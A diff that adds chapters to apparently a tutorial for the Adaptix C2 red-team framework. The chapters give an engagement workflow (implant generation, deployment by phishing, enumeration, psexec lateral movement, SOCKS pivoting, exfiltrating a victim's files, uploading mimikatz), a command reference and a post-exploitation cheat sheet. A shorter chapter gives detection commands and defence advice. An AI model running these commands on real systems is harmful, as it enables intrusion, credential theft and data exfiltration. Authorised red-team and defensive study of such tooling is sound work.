@@ -307,10 +307,201 @@ adaptix-c2 server --host 0.0.0.0 --port 7777 --password MySecurePassword --debug
 
 ---
 
+## Chapter 9: Real-World Scenarios
+
+### Red Team Engagement Workflow
+
+```bash
+# 1. Start teamserver
+adaptix-c2 server --host 0.0.0.0 --port 7777 --password MySecurePassword
+
+# 2. Connect as operator
+adaptix-c2 client --host teamserver_ip --port 7777 --password MySecurePassword
+
+# 3. Create HTTPS listener
+adaptix-c2 listener add --type https --host redirector.example.com --port 443 \
+  --cert /path/to/cert.pem --key /path/to/key.pem --name https_listener
+
+# 4. Generate implant
+adaptix-c2 generate --type shellcode --platform windows --arch amd64 \
+  --listener https://redirector.example.com:443 --output implant.bin
+
+# 5. Deploy implant via initial access (phishing, exploit, etc.)
+
+# 6. Once agent connects, enumerate
+adaptix-c2 session --id <session_id>
+adaptix-c2 session --id <session_id> --execute "whoami /all"
+adaptix-c2 session --id <session_id> --execute "systeminfo"
+
+# 7. Lateral movement
+adaptix-c2 session --id <session_id> --lateral-move \
+  --target 10.0.0.50 --method psexec --username admin --password P@ssw0rd
+```
+
+### Multi-Hop Pivoting
+
+```bash
+# 1. After compromising first host
+adaptix-c2 session --id <session_id> --port-forward \
+  --local-port 1080 --remote-host 0.0.0.0 --remote-port 0
+
+# 2. Use SOCKS proxy
+adaptix-c2 session --id <session_id> --socks-proxy --local-port 1080
+
+# 3. Configure proxychains
+# /etc/proxychains4.conf:
+# socks5 127.0.0.1 1080
+
+# 4. Scan internal network
+proxychains4 nmap -sT 10.0.0.0/24
+```
+
+### Data Exfiltration
+
+```bash
+# Download sensitive files
+adaptix-c2 session --id <session_id> \
+  --download C:\Users\target\Documents\secrets.xlsx \
+  --output /loot/secrets.xlsx
+
+# Upload tools to target
+adaptix-c2 session --id <session_id> \
+  --upload /tools/mimikatz.exe \
+  --output C:\temp\mimikatz.exe
+```
+
+---
+
+## Chapter 10: Command Reference
+
+### Server Commands
+
+| Command | Description |
+|---|---|
+| `server --host <ip> --port <port> --password <pass>` | Start teamserver |
+| `client --host <ip> --port <port> --password <pass>` | Connect as client |
+
+### Listener Commands
+
+| Command | Description |
+|---|---|
+| `listener add --type http --host <ip> --port <port>` | Create HTTP listener |
+| `listener add --type https --host <ip> --port <port> --cert <cert> --key <key>` | Create HTTPS listener |
+| `listener list` | List active listeners |
+| `listener remove --id <id>` | Remove a listener |
+
+### Implant Commands
+
+| Command | Description |
+|---|---|
+| `generate --type <type> --platform <os> --arch <arch> --listener <url>` | Generate implant |
+| `generate --type exe` | Generate EXE implant |
+| `generate --type shellcode` | Generate shellcode |
+| `generate --type dll` | Generate DLL implant |
+
+### Session Commands
+
+| Command | Description |
+|---|---|
+| `sessions` | List active sessions |
+| `session --id <id>` | Interact with session |
+| `session --id <id> --kill` | Kill session |
+| `session --id <id> --execute "<cmd>"` | Execute command |
+| `session --id <id> --download <remote> --output <local>` | Download file |
+| `session --id <id> --upload <local> --output <remote>` | Upload file |
+| `session --id <id> --port-forward --local-port <port>` | Port forward |
+| `session --id <id> --socks-proxy --local-port <port>` | SOCKS proxy |
+| `session --id <id> --lateral-move --target <ip> --method <method>` | Lateral movement |
+
+---
+
+## Chapter 11: Detection and Defense
+
+### Network Signatures
+
+- HTTPS traffic to non-standard ports from non-browser processes
+- Periodic HTTP(S) beaconing patterns
+- Unusual process injection indicators
+- TLS certificate anomalies (self-signed, short-lived)
+
+### Host-Based Detection
+
+```bash
+# Monitor for C2 beaconing
+# Look for periodic network connections
+netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn
+
+# Check for suspicious processes
+ps aux | grep -i "implant\|beacon\|shell"
+```
+
+### Defense Recommendations
+
+1. Deploy EDR with C2 detection capabilities
+2. Monitor for process injection techniques
+3. Implement TLS inspection for outbound traffic
+4. Use network traffic analysis for beacon detection
+5. Monitor for credential dumping tools
+
+### Beacon Detection
+
+```bash
+# Analyze network traffic for beaconing patterns
+# Tools: RITA, Zeek, or custom scripts
+# Look for regular intervals (e.g., every 60 seconds)
+# Check for consistent payload sizes
+```
+
+---
+
 ## Resources
 
 - **GitHub Repository:** https://github.com/EmperorPenguin0/Adaptix-C2
 - **Kali Tools Page:** https://www.kali.org/tools/adaptix-c2/
 - **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
+- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
+- **MITRE ATT&CK - Remote Services:** https://attack.mitre.org/techniques/T1021/
 - **Red Team Infrastructure Guide:** Various community resources on C2 infrastructure setup
 - **Related Tools:** Havoc, Metasploit Framework, PowerShell Empire
+
+---
+
+## Appendix: Quick Reference Card
+
+### One-Liner Commands
+
+```bash
+# Start server
+adaptix-c2 server --host 0.0.0.0 --port 7777 --password MySecurePassword
+
+# Connect client
+adaptix-c2 client --host <ip> --port 7777 --password MySecurePassword
+
+# Generate implant
+adaptix-c2 generate --type exe --platform windows --arch amd64 --listener http://<ip>:8080 --output implant.exe
+
+# Execute command
+adaptix-c2 session --id <id> --execute "whoami /all"
+```
+
+### Common Post-Exploitation Commands
+
+| Command | Description |
+|---|---|
+| `--execute "whoami /all"` | Current user context |
+| `--execute "systeminfo"` | System information |
+| `--execute "ipconfig /all"` | Network configuration |
+| `--execute "net user"` | List users |
+| `--execute "net localgroup administrators"` | List administrators |
+| `--execute "tasklist"` | Running processes |
+| `--download <remote> --output <local>` | Download file |
+| `--upload <local> --output <remote>` | Upload file |
+
+### Listener Types
+
+| Type | Description |
+|---|---|
+| `http` | Standard HTTP listener |
+| `https` | HTTPS with TLS encryption |
+| `tcp` | Raw TCP listener |
+| `dns` | DNS-based listener |
